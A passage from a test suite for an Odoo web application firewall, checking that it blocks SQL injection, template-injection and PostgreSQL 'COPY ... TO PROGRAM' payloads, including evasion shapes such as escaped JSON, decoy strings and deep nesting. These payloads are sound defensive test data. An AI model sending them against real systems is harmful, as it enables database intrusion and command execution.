            fresh = self._dbread(lambda env: [
                e.expires > fields.Datetime.now()
                for e in env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto"),
                    ("active", "=", True)])])
            self.assertTrue(any(fresh),
                            "burst must apply a NEW lockout despite the "
                            "expired-but-not-yet-swept entry")
        finally:
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.ip.entry"].search([("network", "=", net)]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_43_policy_refresh_failure_keeps_last_good_policy(self):
        # review F06 + round 9 addendum: a read failure must be handled
        # AS a failure by the REAL fetch path. An earlier version of
        # this test replaced _fetch_snapshot with a stub returning the
        # sentinel, so the genuine outer except-branch (pool outage,
        # dead connection) still returned None and silently dropped the
        # working policy. Here the connection factory underneath the
        # untouched _fetch_snapshot is broken instead.
        db = self.env.cr.dbname
        r = self.url_open("/web/login")  # prime a healthy policy
        self.assertEqual(r.status_code, 200)
        cached = middleware._snaps.get(db)
        self.assertTrue(cached and cached[1], "policy primed")

        class _DeadConn:
            def cursor(self, *a, **k):
                raise OSError("simulated pool outage")

        orig = middleware.db_connect
        middleware._snap_fail_ts.clear()  # make sure the warning fires
        try:
            middleware.db_connect = lambda dbname, *a, **k: _DeadConn()
            middleware._snaps[db] = (0.0, cached[1])  # force a refresh
            with self.assertLogs("odoo.addons.ow_shield.core.middleware",
                                 level="WARNING") as logs:
                r = self.url_open("/?q=1%20UNION%20SELECT%20f6--",
                                  headers={"X-Real-IP": "203.0.116.66"})
            self.assertEqual(r.status_code, 403,
                             "last good policy must still be enforced")
            cached2 = middleware._snaps.get(db)
            self.assertTrue(cached2 and cached2[1],
                            "a failed fetch must not blank the cache")
            self.assertTrue(any("policy refresh failed" in msg
                                for msg in logs.output),
                            "the degraded mode must be logged, not quiet")
        finally:
            middleware.db_connect = orig
            middleware.reset_caches()

    def test_44_json_body_unicode_escapes_reach_the_rules(self):
        # review F02 (parser parity): the controller receives
        # json.loads(body), but body rules saw only raw bytes -- the
        # very same string got a different security decision just
        # because every character was written as a \uXXXX escape.
        # Body inspection now scans the raw capture AND every decoded
        # JSON string value.
        ip = "203.0.116.67"
        payload = "1 UNION SELECT 1,2,3"
        escaped = "".join("\\u%04x" % ord(c) for c in payload)
        r = self.url_open(
            "/waf-body-probe",
            data=json.dumps({"jsonrpc": "2.0", "params":
                             {"args": [payload]}}),
            headers={"X-Real-IP": ip, "Content-Type": "application/json"})
        self.assertEqual(r.status_code, 403, "literal JSON payload")
        r = self.url_open(
            "/waf-body-probe",
            data='{"jsonrpc": "2.0", "params": {"args": ["%s"]}}' % escaped,
            headers={"X-Real-IP": ip, "Content-Type": "application/json"})
        self.assertEqual(r.status_code, 403,
                         "same payload \\uXXXX-escaped: parity")
        r = self.url_open(
            "/waf-body-probe",
            data=json.dumps({"jsonrpc": "2.0", "method": "call",
                             "params": {"model": "res.partner",
                                        "args": [42, "price 10*5"]}}),
            headers={"X-Real-IP": ip, "Content-Type": "application/json"})
        self.assertNotEqual(r.status_code, 403, "legit JSON-RPC body passes")

    def test_45_form_plus_encoding_matches_the_app(self):
        # review F02 (form side): werkzeug hands the controller
        # "1 UNION SELECT 1,2,3" for the body "x=1+UNION+SELECT+...",
        # yet the raw scan saw none of it. %2B must still arrive as a
        # literal plus (mirrors the query-scope handling).
        ip = "203.0.116.68"
        form = {"X-Real-IP": ip,
                "Content-Type": "application/x-www-form-urlencoded"}
        r = self.url_open("/waf-body-probe",
                          data="x=1+UNION+SELECT+1%2C2%2C3",
                          headers=form)
        self.assertEqual(r.status_code, 403,
                         "'+' is a space to the app; parity required")
        r = self.url_open("/waf-body-probe",
                          data="price=10%25+off+shipping+1%2B1",
                          headers=form)
        self.assertNotEqual(r.status_code, 403,
                            "legit form data must survive untouched")

    def test_46_json_decoy_strings_cannot_hide_payload(self):
        # review round 9 P1 (repro): a valid ~24 KB JSON body with 4001
        # harmless strings FIRST and the \uXXXX-escaped payload after
        # them. The parity walk used to silently stop at 4000 strings --
        # the rules saw nothing while json.loads handed the payload to
        # the controller plain, all well inside the 64 KB cap. The walk
        # is now complete within the cap: no cutoff left to hide behind.
        ip = "203.0.116.71"
        payload = "1 UNION SELECT 1,2,3"
        esc = "".join("\\u%04x" % ord(c) for c in payload)
        decoys = ",".join('"f%d"' % i for i in range(4001))
        body = '{"params": {"args": [%s, "%s"]}}' % (decoys, esc)
        self.assertLess(len(body), 65536, "well inside the scan cap")
        self.assertNotIn("union", body.lower(),
                         "the raw scan alone must stay blind here")
        r = self.url_open("/waf-body-probe", data=body,
                          headers={"X-Real-IP": ip,
                                   "Content-Type": "application/json"})
        self.assertEqual(
            r.status_code, 403,
            "parity scan must reach the payload behind thousands of "
            "decoy values (no silent walk budget left)")

    def test_47_deep_json_nesting_still_reaches_payload(self):
        # review round 9 P1 (depth shape): the parity walk silently
        # stopped descending at depth 32 -- nest the escaped payload one
        # level deeper and only the app saw it. There is now no
        # depth limit on our side (json.loads' own parser limits are
        # core's problem to enforce).
        ip = "203.0.116.74"
        payload = "1 UNION SELECT 1,2,3"
        esc = "".join("\\u%04x" % ord(c) for c in payload)
        depth = 200
        body = "[" * depth + '"%s"' % esc + "]" * depth
        r = self.url_open("/waf-body-probe", data=body,
                          headers={"X-Real-IP": ip,
                                   "Content-Type": "application/json"})
        self.assertEqual(r.status_code, 403,
                         "depth 200 must not exempt the payload")

    def test_48_body_over_scan_cap_notes_partial_inspection(self):
        # review round 9 (overflow policy, visibility half): a body
        # past body_scan_max is only inspectable up to the cap -- by
        # raw AND parity scan -- while the app parses the whole thing.
        # No longer silent: exactly one log-only coverage note per
        # db+IP per window appears in the traffic log. The request is
        # NOT blocked (legit >cap JSON-RPC attachments / bulk writes
        # are routine; making the block configurable stays a roadmap
        # decision).
        net_ip = "203.0.116.75"
        net_ip2 = "203.0.116.76"
        net_ip3 = "203.0.116.77"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("mode", "body_scan_max")}
            # 4096 = the BODY_SCAN_MIN floor (review round 17 F02): the
            # tiny 512 this fixture used before is refused by the new
            # constraint, and the scenario does not need anything
            # smaller -- the payload just has to sit past the cap.
            cfg.write({"mode": "enforce", "body_scan_max": 4096})
            return before

        before = self._dbwrite(_setup)
        try:
            headers = {"X-Real-IP": net_ip,
                       "Content-Type": "application/x-www-form-urlencoded"}
            # payload sits entirely past the 4096-byte capture cap
            body = "x=" + "a" * 4400 + "+UNION+SELECT+1%2C2%2C3"

            def _notes(env):
                return sorted(
                    h.ip for h in env["waf.hit"].search(
                        [("path", "=", "/waf-body-probe"),
                         ("category", "=", "coverage")]))

            r = self.url_open("/waf-body-probe", data=body, headers=headers)
            self.assertNotEqual(
                r.status_code, 403,
                "over-cap payload: not blocked (documented roadmap policy)")
            middleware.flush_hits()
            self.assertEqual(self._dbread(_notes), [net_ip],
                             "exactly one partial-inspection coverage note")
            # throttled per db+IP inside the window...
            self.url_open("/waf-body-probe", data=body, headers=headers)
            # ...but a different source gets its own note
            self.url_open("/waf-body-probe", data=body,
                          headers={"X-Real-IP": net_ip2,
                                   "Content-Type":
                                       "application/x-www-form-urlencoded"})
            # ...and multipart truncation is NOT flagged at all: file
            # parts are the attachment scanner's job by design (part
            # enlarged past the 4096 cap for the same fixture reason)
            self.url_open("/waf-body-probe",
                          data={"q": "a" * 600},
                          files={"f": ("ok.txt", b"b" * 4600, "text/plain")},
                          headers={"X-Real-IP": net_ip3})
            middleware.flush_hits()
            self.assertEqual(self._dbread(_notes), sorted([net_ip, net_ip2]),
                             "one note per source IP; repeats suppressed; "
                             "multipart never flagged")
        finally:
            middleware._overflow_seen.clear()
            self._dbwrite(lambda env: (
                env["waf.config"].get_singleton().write(before),
                env["waf.hit"].search(
                    [("path", "=", "/waf-body-probe")]).unlink(),
            ))

    def test_49_flush_fallback_keeps_valid_rows_around_a_bad_one(self):
        # review round 10: the row-by-row flush fallback recovered from a
        # bad row with a plain cr.rollback() -- under a real cursor (and
        # under TestCursor, whose rollback is "ROLLBACK TO the fallback's
        # own savepoint") that discards every valid row inserted BEFORE
        # the bad one, while stored still counted them: seed valid ->
        # invalid -> valid and the honest outcome is "1 of 3", not the
        # reported "2 of 3". Each retry now runs inside its own
        # savepoint, so only the bad row undoes itself. Verify BOTH
        # valid rows really exist afterwards, the invalid one does not,
        # and the warning states the true stored count.
        db = self.env.cr.dbname
        paths = ["/waf-flush-probe-%s" % t for t in ("a", "b", "c")]

        def _row(ref, path, kind):
            return {
                "ref": ref, "ip": "203.0.116.79", "country": "",
                "method": "POST", "path": path, "query": "", "ua": "",
                "rule_id": None, "rule_name": "flush probe",
                "category": "probe", "severity": 1, "kind": kind,
                "action": "log", "mode": "learning", "blocked": False,
            }

        with middleware._hit_lock:
            middleware._hit_buffer = [
                (db, _row("flushA", paths[0], "rule")),
                (db, _row("flushB", paths[1], "not-a-kind")),  # invalid
                (db, _row("flushC", paths[2], "rule")),
            ]

        warns = []
        orig = (middleware._logger.warning, middleware._last_error_ts)
        middleware._logger.warning = \
            lambda fmt, *a, **k: warns.append(fmt % a)
        try:
            middleware._last_error_ts = 0.0
            middleware.flush_hits()
            self.assertEqual(
                warns,
                ["WAF: could not flush hits for %s (2 of 3 stored)" % db],
                "fallback must warn exactly once, with an HONEST count")
            got = self._dbread(lambda env: sorted(
                (h.path, h.kind) for h in env["waf.hit"].search(
                    [("path", "in", paths)])))
            self.assertEqual(
                got, [(paths[0], "rule"), (paths[2], "rule")],
                "valid rows BEFORE and AFTER the bad one must both survive")
        finally:
            middleware._logger.warning, middleware._last_error_ts = orig
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "in", paths)]).unlink())

    # =====================================================================
    # Round 11: endpoint policies, structured RPC matching, pre-database
    # coverage, signup/reset flood limits, report/export bursts, targeted
    # exceptions (19.0.2.6.0).
    # =====================================================================

    def test_50_dbmanager_policy_covers_full_route_group(self):
        before = self._policy("waf-ep-dbmanager", action="block")
        try:
            hdr = {"X-Real-IP": "203.0.113.50"}
            for path, data in (
                    ("/web/database/selector", None),
                    ("/web/database/manager", None),
                    ("/web/database/selector", None),
                    ("/web/database/create", urlencode(
                        {"master_pwd": "x", "name": "evil", "login": "a",
                         "password": "b"})),
                    ("/web/database/duplicate", "x=1"),
                    ("/web/database/change_password", "x=1"),
                    ("/web/database/drop", "x=1"),
                    ("/web/database/backup", "x=1"),
                    ("/web/database/restore", "x=1"),
            ):
                r = (self.url_open(path, headers=hdr) if data is None else
                     self.url_open(path, data=data, headers=dict(
                         hdr, **{"Content-Type":
                                "application/x-www-form-urlencoded"})))
                self.assertEqual(r.status_code, 403, path)
            # the JSON list route (type='jsonrpc' in Odoo 19) is covered too,
            # and answered in JSON rather than an HTML page
            r = self.url_open(
                "/web/database/list",
                data=json.dumps({"jsonrpc": "2.0", "method": "call",
                                 "id": 1, "params": {}}),
                headers=dict(hdr, **{"Content-Type": "application/json"}))
            self.assertEqual(r.status_code, 403)
            self.assertEqual(r.headers.get("Content-Type", "").split(";")[0],
                             "application/json")
            rows = self._hit_rows("/web/database/selector")
            self.assertTrue(all(x["kind"] == "endpoint" for x in rows))
            self.assertTrue(rows and all(x["blocked"] for x in rows))
            # normal backend surfaces are NOT part of the group
            self.assertEqual(self.url_open("/web/login").status_code, 200)
            self.assertEqual(self.url_open("/web/database/list").status_code,
                             403)  # even anonymous without X-Real-IP
            # learning mode: visible, never refused
            self._dbwrite(lambda env: env["waf.config"].get_singleton()
                          .write({"mode": "learning"}))
            try:
                r = self.url_open("/web/database/selector", headers=hdr)
                self.assertNotEqual(r.status_code, 403)
                rows = self._hit_rows("/web/database/selector")
                self.assertTrue([x for x in rows if not x["blocked"]])
            finally:
                self._dbwrite(lambda env: env["waf.config"].get_singleton()
                              .write({"mode": "enforce"}))
            # explicit trusted-management-network exception, this policy only
            self._policy("waf-ep-dbmanager", exempt_nets="203.0.113.0/24")
            try:
                # exempt means NOT POLICY TRAFFIC: the endpoint policy must
                # contribute no new decision. Signature rules still watch
                # (the bundled scripted-client UA rule logs this probe as
                # ordinary recon visibility -- that is by design).
                def _policy_hits():
                    return [x for x in self._hit_rows("/web/database/selector")
                            if x["kind"] == "endpoint"]
                before_exempt = len(_policy_hits())
                r = self.url_open("/web/database/selector", headers=hdr)
                self.assertNotEqual(r.status_code, 403, "exempt net must pass")
                self.assertEqual(len(_policy_hits()), before_exempt,
                                 "exempt traffic is not policy traffic")
            finally:
                self._policy("waf-ep-dbmanager", exempt_nets="")
        finally:
            self._policy("waf-ep-dbmanager", **before)
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=like", "/web/database/%")]).unlink())

    def test_51_pre_database_coverage_without_selected_db(self):
        # review: the protection must work BEFORE Odoo selects a database.
        # A hostile Host header that matches no dbfilter still reaches the
        # db manager (master-password routes ignore dbfilter) -- guard()
        # falls back to apply_pre_db policies of any loaded registry.
        before = self._policy("waf-ep-dbmanager", action="block")
        try:
            with patch.object(middleware, "_resolve_db",
                              lambda environ, session: None):
                r = self.url_open("/web/database/selector",
                                  headers={"X-Real-IP": "203.0.113.51"})
                self.assertEqual(r.status_code, 403)
                rows = self._hit_rows("/web/database/selector")
                self.assertTrue(
                    any("(pre-database)" in x["name"] for x in rows
                        if x["blocked"]),
                    "hit must be honestly marked as pre-database coverage")
                # hostname/database boundaries: with no policy db resolved,
                # NO other policy is borrowed -- /web/login and xmlrpc pass
                self.assertEqual(self.url_open("/web/login").status_code, 200)
                r = self.url_open(
                    "/xmlrpc/db", data="<methodCall/>",
                    headers={"X-Real-IP": "203.0.113.51",
                             "Content-Type": "text/xml"})
                self.assertNotEqual(r.status_code, 403)
        finally:
            self._policy("waf-ep-dbmanager", **before)
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=like", "/web/database/%")]).unlink())

    def test_52_rpc_service_policies_are_structured(self):
        b_xmldb = self._policy("waf-ep-xmldb", action="block")
        b_jsondb = self._policy("waf-ep-jsonrpc-db", action="block")
        hdr = {"X-Real-IP": "203.0.113.52"}

        def _env(params, id=1):
            return json.dumps({"jsonrpc": "2.0", "method": "call",
                               "id": id, "params": params}).encode()

        def _post_json(query, params, raw=None):
            return self.url_open(
                "/jsonrpc?" + query,
                data=raw if raw is not None else _env(params),
                headers=dict(hdr, **{"Content-Type": "application/json"}))
        try:
            # both legacy XML-RPC route families carry the service in the path
            xml_body = ("<?xml version=\"1.0\"?><methodCall>"
                        "<methodName>list</methodName><params/>"
                        "</methodCall>").encode()
            for path in ("/xmlrpc/db", "/xmlrpc/2/db"):
                r = self.url_open(path, data=xml_body,
                                  headers=dict(hdr, **{
                                      "Content-Type": "text/xml"}))
                self.assertEqual(r.status_code, 403, path)
            # ... while the OTHER services keep working (integrations):
            r = self.url_open("/xmlrpc/2/common", data=(
                "<?xml version=\"1.0\"?><methodCall><methodName>version"
                "</methodName><params/></methodCall>").encode(),
                headers=dict(hdr, **{"Content-Type": "text/xml"}))
            self.assertNotEqual(r.status_code, 403)
            self.assertNotIn(b"OW Shield", r.content)

            # /jsonrpc: the PARSED service decides
            r = _post_json("p=db", {"service": "db", "method": "list",
                                    "args": []})
            self.assertEqual(r.status_code, 403)
            self.assertEqual(r.headers.get("Content-Type", "").split(";")[0],
                             "application/json")
            # execute_kw(db, uid, pw, model, method, ids): args[0] is
            # literally "db" but the SERVICE is "object" -> must pass
            r = _post_json("p=decoy", {
                "service": "object", "method": "execute_kw",
                "args": ["db", 1, "wrong-pw", "res.partner", "read", []]})
            self.assertNotEqual(r.status_code, 403,
                                "structured match must not fire on an "
                                "incidental 'db' string in the arguments")
            # lookalike service names must not fire either
            r = _post_json("p=lookalike", {"service": "dbx", "method": "list",
                                           "args": []})
            self.assertNotEqual(r.status_code, 403)
            # malformed JSON fully inside the capture: never blocked by
            # the rpc matcher -- Odoo's own dispatcher rejects such a
            # body itself, so there is no hidden operation to fail
            # closed on (contrast the truncated case below)
            r = _post_json("p=malformed", None, raw=b"}{this is not json")
            self.assertNotEqual(r.status_code, 403)
            self.assertNotIn(b"OW Shield", r.content)
            # big but complete body: 40 KB junk inside the arguments does
            # not hide the operation -- structured match still fires
            r = _post_json("p=big", {"service": "db", "method": "list",
                                     "args": ["x" * 40000]})
            self.assertEqual(r.status_code, 403)
            # body over the signature SCAN cap but inside the RPC parse
            # cap (512 KiB): the envelope is parsed anyway, so the
            # structured service policy STILL fires -- padding past the
            # scan cap can no longer hide a db-service request from an
            # explicit endpoint restriction (round-12 P2 fix; before it,
            # exactly this shape slipped through at 66 KB). The
            # signature layer's partial-inspection coverage note is
            # still honestly recorded alongside the block.
            middleware._overflow_seen.clear()
            r = _post_json("p=oversize", None,
                           raw=(b'{"jsonrpc":"2.0","method":"call","id":1,'
                                b'"params":{"service":"db","method":"list",'
                                b'"args":["pad' + b"x" * 300000 + b'"]}}'))
            self.assertEqual(
                r.status_code, 403,
                "the service restriction must survive a body past the "
                "signature scan cap (the operation is still parseable)")
            self.assertIn(b"OW Shield", r.content)
            rows = self._hit_rows("/jsonrpc")
            self.assertTrue(
                any(x["kind"] == "body" and x["query"] == "p=oversize"
                    for x in rows),
                "a body past the scan cap must ALSO say it was only "
                "partially inspected for the signature rules")
        finally:
            self._policy("waf-ep-xmldb", **b_xmldb)
            self._policy("waf-ep-jsonrpc-db", **b_jsondb)
            middleware._overflow_seen.clear()
            middleware.flush_hits()   # buffered probes must not leak on

            def _clean(env):
                env["waf.hit"].search([("path", "in", (
                    "/jsonrpc", "/xmlrpc/db", "/xmlrpc/2/db",
                    "/xmlrpc/2/common"))]).unlink()
            self._dbwrite(_clean)

    def test_53_signup_flood_per_ip_blocks_and_recovers(self):
        before = self._policy("waf-ep-signup", rate_max=3,
                              rate_block_minutes=15)
        hdr = {"X-Real-IP": "203.0.113.53",
               "Content-Type": "application/x-www-form-urlencoded"}
        body = urlencode({"name": "Flood Bot", "login": "flood.bot@example.nl",
                          "password": "secret-password-1",
                          "confirm_password": "secret-password-1"})
        try:
            for i in range(3):
                r = self.url_open("/web/signup", data=body, headers=hdr)
                self.assertNotEqual(r.status_code, 403, "under limit #%d" % i)
            # below the limit: ordinary traffic being counted, NOT logged
            # (otherwise the traffic log itself becomes the flood target)
            self.assertEqual(self._hit_rows("/web/signup"), [])
            r = self.url_open("/web/signup", data=body, headers=hdr)
            self.assertEqual(r.status_code, 403)
            rows = self._hit_rows("/web/signup")
            self.assertEqual(len(rows), 1, "only the crossing is logged")
            self.assertEqual(rows[0]["kind"], "endpoint")
            self.assertIn("(4 in 10 min", rows[0]["name"])
            joined = " ".join(r["name"] + " " + r["query"] for r in rows)
            self.assertNotIn("secret-password", joined,
                             "passwords must never reach the log")
            self.assertNotIn("flood.bot", joined)
            # the crossing also applied an expiring auto-deny entry for the
            # flooding address -- the whole IP cools off, with recovery mail
            entry_ok = self._dbread(lambda env: any(
                e.expires for e in env["waf.ip.entry"].search(
                    [("network", "=", "203.0.113.53/32")])))
            self.assertTrue(entry_ok,
                            "auto entry must exist AND expire by itself")
            r = self.url_open("/web/login", headers=hdr)
            self.assertEqual(r.status_code, 403, "IP cooling off")
            r = self.url_open("/web/login", headers={"X-Real-IP": "203.0.113.50"})
            self.assertEqual(r.status_code, 200, "innocent neighbours unaffected")
        finally:
            self._policy("waf-ep-signup", **before)
            self._clear_net("203.0.113.53")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/web/signup")]).unlink())

    def test_54_reset_flood_targeting_one_account_is_masked_not_locked(self):
        b_ip = self._policy("waf-ep-reset-ip", rate_max=1000)
        b_ac = self._policy("waf-ep-reset-account", rate_max=2)
        hdr = {"X-Real-IP": "203.0.113.54",
               "Content-Type": "application/x-www-form-urlencoded"}
        body = urlencode({"login": "victim-account@example.com"})
        try:
            for _ in range(4):
                r = self.url_open("/web/reset_password", data=body,
                                  headers=hdr)
                # the ACCOUNT-keyed limit is deliberately log-only: blocking
                # on it would let an attacker deny the victim their own
                # password reset -- the deliberate account lockout the
                # feature must never create. The per-IP policy does blocking.
                self.assertNotEqual(r.status_code, 403)
            rows = self._hit_rows("/web/reset_password")
            self.assertTrue(rows and not any(x["blocked"] for x in rows),
                            "the account-keyed limit must never block: %r"
                            % rows)
            # requests 3 and 4 crossed the per-account limit of 2; other
            # rows (e.g. the bundled scripted-client UA rule watching the
            # probe, or redirects the app issues) are ordinary visibility
            crossed = [x for x in rows if "in 10 min, targeting" in x["name"]]
            self.assertEqual(len(crossed), 2,
                             "requests 3 and 4 crossed: %r" % rows)
            for row in crossed:
                self.assertIn("targeting vi***", row["name"])
            for row in rows:
                self.assertNotIn(
                    "victim-account@example.com", row["name"] + row["query"],
                    "the targeted login must stay masked everywhere")
            # the counter key holds a hash, not the account identifier
            # (namespaced per policy since 2.7.0: "p<policy>:t:login:<hash>")
            keys = self._dbread(lambda env: [
                h.network for h in env["waf.rate.hit"].search(
                    [("network", "=like", "%t:login:%")])])
            self.assertTrue(keys)
            for k in keys:
                self.assertNotIn("victim", k)
        finally:
            self._policy("waf-ep-reset-ip", **b_ip)
            self._policy("waf-ep-reset-account", **b_ac)
            self._clear_net("203.0.113.54")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/web/reset_password")]).unlink())

    def test_55_report_id_limits_and_export_bursts(self):
        before = self._policy("waf-ep-report", action="block",
                              ids_max=2, rate_max=0)
        try:
            hdr = {"X-Real-IP": "203.0.113.55"}
            # the doc-id segment of /report/<converter>/<report>/<ids> is
            # counted straight from the path, no body parsing involved
            r = self.url_open("/report/pdf/does.not.exist/1,2,3", headers=hdr)
            self.assertEqual(r.status_code, 403)
            rows = self._hit_rows("/report/pdf/does.not.exist/1,2,3")
            self.assertIn("3 document ids > limit 2", rows[0]["name"])
            r = self.url_open("/report/pdf/does.not.exist/1,2", headers=hdr)
            self.assertNotEqual(r.status_code, 403, "at/below limit passes")
            # burst counting mode (the shipped default is exactly this,
            # just with a generous limit): crossings only
            self._policy("waf-ep-report", action="log", ids_max=0, rate_max=2)
            hdr2 = {"X-Real-IP": "203.0.113.56"}
            for _ in range(3):
                r = self.url_open("/report/html/nope.report/1", headers=hdr2)
                self.assertNotEqual(r.status_code, 403,
                                    "log-only burst policy never blocks")
            rows = self._hit_rows("/report/html/nope.report/1")
            self.assertEqual(len(rows), 1)
            self.assertIn("(3 in 10 min", rows[0]["name"])
        finally:
            self._policy("waf-ep-report", **before)
            self._clear_net("203.0.113.55")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=like", "/report/%")]).unlink())

    def test_56_python_pg_and_qweb_signature_pack(self):
        codes = ("waf-ssti-py-chain-q", "waf-ssti-py-chain-b",
                 "waf-ssti-py-attr-q", "waf-ssti-py-attr-b",
                 "waf-pg-copy-program-q", "waf-pg-copy-program-b",
                 "waf-pg-server-program-q", "waf-pg-server-program-b")
        have = self._dbread(lambda env: env["waf.rule"].search_count(
            [("code", "in", list(codes))]))
        self.assertEqual(have, len(codes),
                         "pack reload must have created every new rule")
        hdr = {"X-Real-IP": "203.0.113.57",
               "Content-Type": "application/json"}

        def _post(tag, payload):
            return self.url_open("/waf-newrules?b=" + tag,
                                 data=json.dumps({"x": payload}), headers=hdr)
        try:
            # combinations = blocked
            r = _post("chain", "__class__ __mro__ __subclasses__(")
            self.assertEqual(r.status_code, 403)
            r = _post("copy", "COPY users TO PROGRAM 'id'")
            self.assertEqual(r.status_code, 403)
            r = _post("qweb", "<t t-call=\"internal_view\"/>")
            self.assertEqual(r.status_code, 403)
            # ambiguous singletons = logged, never refused
            r = _post("attr", "docs mention __class__ here")
            self.assertNotEqual(r.status_code, 403)
            r = _post("role", "GRANT pg_execute_server_program TO analyst")
            self.assertNotEqual(r.status_code, 403)
            rows = self._hit_rows("/waf-newrules")
            logged = {r_["query"] for r_ in rows if not r_["blocked"]}
            self.assertIn("b=attr", logged)
            self.assertIn("b=role", logged)
            # query scope behaves the same
            r = self.url_open("/waf-newrules?q=chain&q1=__import__(%27os%27)",
                              headers={"X-Real-IP": "203.0.113.57"})
            self.assertEqual(r.status_code, 403)
            r = self.url_open("/waf-newrules?q=attr&q1=__globals__",
                              headers={"X-Real-IP": "203.0.113.57"})
            self.assertNotEqual(r.status_code, 403)
            # long non-matching body over the scan cap: not blocked, and
            # honestly reported as partially inspected (never silent)
            middleware._overflow_seen.clear()
            r = _post("huge", "a" * 70000)
            self.assertNotEqual(r.status_code, 403)
            rows = self._hit_rows("/waf-newrules")
            self.assertTrue(any(x["kind"] == "body" and
                                x["query"] == "b=huge" for x in rows),
                            "oversized bodies get a coverage note")
        finally:
            middleware._overflow_seen.clear()
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/waf-newrules")]).unlink())

    def test_57_targeted_exceptions_are_scoped_and_expire(self):
        before = self._policy("waf-ep-dbmanager", action="block")
        exc_id = self._dbwrite(lambda env: env["waf.exception"].create({
            "name": "Office VPN probe",
            "policy_id": env["waf.endpoint.policy"].search(
                [("code", "=", "waf-ep-dbmanager")]).id,
            "methods": "GET",
            "route_re": r"^/web/database/selector$",
            "reason": "Office VPN test",
        }).id)
        rule_exc_id = None
        hdr = {"X-Real-IP": "203.0.113.58"}
        try:
            r = self.url_open("/web/database/selector", headers=hdr)
            self.assertNotEqual(r.status_code, 403,
                                "live exception downgrades to log-only")
            rows = self._hit_rows("/web/database/selector")
            self.assertTrue(rows and not any(x["blocked"] for x in rows))
            self.assertIn("[excepted: Office VPN test]", rows[-1]["name"],
                          "the log must say WHY it did not block")
            # scope: the exception covers GET on ONE route of the group --
            # every other route/method of the blocked policy still refuses
            r = self.url_open("/web/database/create", data="x=1",
                              headers=dict(hdr, **{
                                  "Content-Type":
                                      "application/x-www-form-urlencoded"}))
            self.assertEqual(r.status_code, 403)
            r = self.url_open("/web/database/manager", headers=hdr)
            self.assertEqual(r.status_code, 403)
            # expiry makes the exception inert
            self._dbwrite(lambda env: env["waf.exception"].browse(exc_id)
                          .write({"expires": fields.Datetime.now()
                                  - timedelta(minutes=1)}))
            r = self.url_open("/web/database/selector", headers=hdr)
            self.assertEqual(r.status_code, 403,
                             "expired exception must not shield anything")
            # rule-scoped exception with exact route
            rule_exc_id = self._dbwrite(lambda env: env["waf.exception"].create({
                "name": "Exact-route rule exception",
                "rule_id": self.rule_id,
                "route_re": r"^/waf-test-blockme$",
                "reason": "scoped to the exact path",
            }).id)
            r = self.url_open("/waf-test-blockme")
            self.assertEqual(r.status_code, 404, "rule downgraded to log")
            r = self.url_open("/waf-test-blockme/sub")
            self.assertEqual(r.status_code, 403, "route scope is honoured")
        finally:
            self._dbwrite(lambda env: env["waf.exception"].browse(
                [exc_id] + [rule_exc_id]).unlink())
            self._policy("waf-ep-dbmanager", **before)
            self._dbwrite(lambda env: env["waf.hit"].search([
                ("path", "=like", "/web/database/%"),
                ("path", "=like", "/waf-test-blockme%"),
            ]).unlink())

    def test_58_policy_pack_reload_preserves_admin_tuning(self):
        def _w(env):
            pol = env["waf.endpoint.policy"].search(
                [("code", "=", "waf-ep-dbmanager")])
            pack_route = pol.route_re
            pol.write({"action": "block", "exempt_nets": "10.20.30.0/24",
                       "rate_max": 99, "route_re": "/tampered-by-admin"})
            env["waf.endpoint.policy"].create({
                "code": "waf-test-ep", "name": "custom probe",
                "route_re": "^/waf-test-ep$", "action": "block",
            })
            before_n = env["waf.endpoint.policy"].search_count([])
            created, updated = env["waf.endpoint.policy"] \
                .load_builtin_policies()
            after_n = env["waf.endpoint.policy"].search_count([])
            pol.invalidate_recordset()
            return {
                "pack_route": pack_route,
                "route_now": pol.route_re, "action": pol.action,
                "exempt": pol.exempt_nets, "rate_max": pol.rate_max,
                "apply_pre_db": pol.apply_pre_db, "source": pol.source,
                "created": created, "before_n": before_n, "after_n": after_n,
                "custom_alive": bool(env["waf.endpoint.policy"].search_count(
                    [("code", "=", "waf-test-ep")])),
            }
        got = self._dbwrite(_w)
        try:
            self.assertEqual(got["route_now"], got["pack_route"],
                             "the pack owns the operational shape: a "
                             "tampered route group is restored on upgrade")
            self.assertEqual(got["action"], "block",
                             "admin verdict survives the reload")
            self.assertEqual(got["exempt"], "10.20.30.0/24",
                             "trusted-network exceptions survive")
            self.assertEqual(got["rate_max"], 99, "rate tuning survives")
            self.assertTrue(got["apply_pre_db"])
            self.assertEqual(got["source"], "builtin")
            self.assertEqual(got["created"], 0, "idempotent: nothing re-created")
            self.assertEqual(got["before_n"], got["after_n"])
            self.assertTrue(got["custom_alive"],
                            "custom policies are outside the pack")
        finally:
            self._dbwrite(lambda env: (
                env["waf.endpoint.policy"].search(
                    [("code", "in", ("waf-test-ep",))]).unlink(),
                env["waf.endpoint.policy"].search(
                    [("code", "=", "waf-ep-dbmanager")]).write(
                    {"action": "log", "exempt_nets": "", "rate_max": 0}),
            ))

    def test_59_rate_counters_shared_across_workers(self):
        # same lesson as 2.4.0 for attack/login counters: the rate limit
        # must mean the SAME thing with 1 or N workers. Two bumps through
        # separate pooled connections (each worker process has its own)
        # plus one real request must cross a limit of 2 -- not 2+2.
        # Since 2.7.0 the live counter row is namespaced by policy
        # ("p<policy id>:<subject>"), so the seeded bumps use that shape.
        before = self._policy("waf-ep-signup", rate_max=2,
                              rate_block_minutes=0)
        db = self.env.cr.dbname
        pol_id = self._dbread(lambda env: env["waf.endpoint.policy"].search(
            [("code", "=", "waf-ep-signup")]).id)
        seed_key = f"p{pol_id}:203.0.113.59"
        try:
            self.assertEqual(
                middleware._bump_lockout(db, seed_key, 600,
                                         table="waf_rate_hit"), 1)
            self.assertEqual(
                middleware._bump_lockout(db, seed_key, 600,
                                         table="waf_rate_hit"), 2)
